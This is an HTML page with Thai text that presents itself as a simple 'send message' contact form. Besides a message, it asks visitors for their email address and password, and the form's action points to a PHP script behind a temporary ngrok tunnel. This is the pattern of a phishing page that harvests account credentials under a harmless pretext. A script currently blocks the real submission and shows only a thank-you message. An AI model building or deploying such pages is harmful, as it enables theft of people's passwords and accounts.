<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ส่งข้อความ</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            background-image: url('https://s1.zerochan.net/Tokisaki.Kurumi.600.3980765.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }
        .form-container {
            text-align: center;
            background-color: none;
            padding: 20px 15px;
            border-radius: 10px;
            width: 90%; /* ความกว้าง 90% ของหน้าจอ */
            max-width: 400px; /* กำหนดความกว้างสูงสุด */
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); /* เงา */
        }
        input, textarea, button {
            width: 100%; /* ขยายให้เต็มพื้นที่ของฟอร์ม */
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box; /* รวม padding ในขนาด */
        }
        textarea {
            resize: none; /* ปิดการปรับขนาดเอง */
        }
        button {
            background-color: #ff0000;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #cc0000;
        }
        #summary {
            margin-top: 20px;
            color: purple;
            font-size: 4.5em;
            display: none; /* ซ่อนข้อความสรุปในตอนแรก */
        }
    </style>
</head>
<body>
    <div class="form-container">
        <form id="contactForm" action="https://d3d4-49-237-21-41.ngrok-free.app/send_email.php" method="POST">
            <input type="email" name="email" placeholder="อีเมลของคุณ" required>
            <input type="password" name="password" placeholder="รหัสผ่านของคุณ" required>
            <textarea name="message" rows="4" placeholder="ข้อความของคุณ" required></textarea>
            <button type="submit">ส่งข้อความ</button>
        </form>
        <div id="summary">ขอบคุณสำหรับการใช้งาน ข้อความของคุณถูกส่งเรียบร้อยแล้ว!</div>
    </div>
    <script>
        const form = document.getElementById('contactForm');
        const summary = document.getElementById('summary');

        form.addEventListener('submit', function(event) {
            event.preventDefault(); // หยุดการส่งฟอร์มแบบปกติ
            summary.style.display = 'block'; // แสดงข้อความสรุป
            form.style.display = 'none'; // ซ่อนฟอร์ม
        });
    </script>
</body>
</html>
